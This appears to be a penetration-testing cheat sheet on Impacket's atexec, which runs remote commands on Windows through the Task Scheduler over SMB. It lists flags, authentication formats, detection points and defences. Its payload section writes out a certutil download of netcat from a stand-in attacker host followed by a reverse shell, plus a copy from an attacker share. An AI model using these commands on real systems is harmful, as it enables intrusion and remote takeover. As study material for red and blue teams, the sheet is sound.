# Impacket-atexec

`impacket-atexec` is a command execution tool from the Impacket suite that abuses the Windows Task Scheduler (`AT-Scheduler`) service to execute commands remotely over SMB.

It is similar in purpose to `psexec`, but instead of creating a service, it creates a scheduled task that runs immediately.

---

# 🔹 Use Cases

- Remote command execution without uploading binaries
- Post-exploitation on Windows systems
- Avoiding detections tied to service creation (`psexec`)
- Delivering payloads using:
  - `certutil`
  - `copy`
  - Reverse shells

---

# 🔹 How It Works

1. Authenticates via SMB using supplied credentials
2. Creates a scheduled task via Windows Task Scheduler
3. Executes the specified command
4. Deletes the scheduled task after execution

---

# 🔹 Key Features

- Uses legitimate scheduled task interfaces
- Often less noisy than `psexec`
- Supports one-shot remote command execution
- Supports:
  - Password authentication
  - NTLM hash authentication
  - Kerberos authentication

---

# 🔹 Authentication Format

```bash
[domain/]username[:password]@<target>
```

---

## ✅ Special Character Handling

If the password contains special characters (such as `@`), wrap the password in single quotes:

```bash
impacket-atexec armour.com/administrator:'@rmour123'@192.168.10.52 whoami
```

---

# 🔹 Typical Payloads

# ✅ Run Simple System Commands

```bash
impacket-atexec user:pass@target systeminfo
```

---

# ✅ Pull and Execute Reverse Shell

```bash
impacket-atexec user:pass@target 'certutil -urlcache -split -f http://attacker/nc64.exe nc64.exe & nc64.exe -e cmd.exe attacker_ip port'
```

---

# ✅ Copy Payload from SMB Share

```bash
impacket-atexec user:pass@target 'copy \\attacker\share\nc64.exe C:\Users\Public\nc64.exe'
```

---

# 🔹 Requirements & Notes

- Requires administrator privileges on the target
- Windows Task Scheduler service must be accessible
- Commands may appear briefly in task history logs
- Unlike `psexec`, it does not provide a fully interactive shell
- Returns command output after execution

# 🔹 Authentication Methods

| Method | Example |
| --- | --- |
| Password | `user:password@target` |
| NTLM Hash | `-hashes LMHASH:NTHASH` |
| Kerberos | `-k -no-pass` |
| AES Key | `-aesKey <AES_KEY>` |

---

# 🔹 Common Flags

| Flag | Description |
| --- | --- |
| `-hashes` | Use NTLM hashes |
| `-k` | Use Kerberos authentication |
| `-no-pass` | Do not prompt for password |
| `-dc-ip` | Specify Domain Controller IP |
| `-target-ip` | Specify target IP |
| `-debug` | Enable debug output |

---

# 🔹 Detection Considerations

| Detection Area | Description |
| --- | --- |
| Task Scheduler Logs | Task creation and deletion |
| Windows Event Logs | Command execution events |
| SMB Authentication Logs | Remote authentication activity |
| Sysmon | Process creation telemetry |

---

# 🔹 Comparison : atexec vs psexec

| Feature | `atexec` | `psexec` |
| --- | --- | --- |
| Uses Scheduled Tasks | Yes | No |
| Creates Windows Service | No | Yes |
| Uploads Binary | No | Yes |
| Interactive Shell | No | Yes |
| Noise Level | Medium | High |

---

# 🔹 Defensive Recommendations

- Restrict remote scheduled task creation
- Monitor Task Scheduler events
- Enable:
  - Sysmon
  - PowerShell Logging
  - Windows Event Forwarding

- Restrict SMB administrative access
- Disable unused remote administration interfaces

---

# 🔹 Summary

`impacket-atexec` is a powerful Impacket tool for remote command execution through Windows Task Scheduler.

It is commonly used during:

- Penetration Testing
- Red Team Operations
- Post-Exploitation
- Active Directory Assessments

Compared to `psexec`, it is often quieter because it avoids service creation and executable uploads while still allowing remote code execution over SMB.
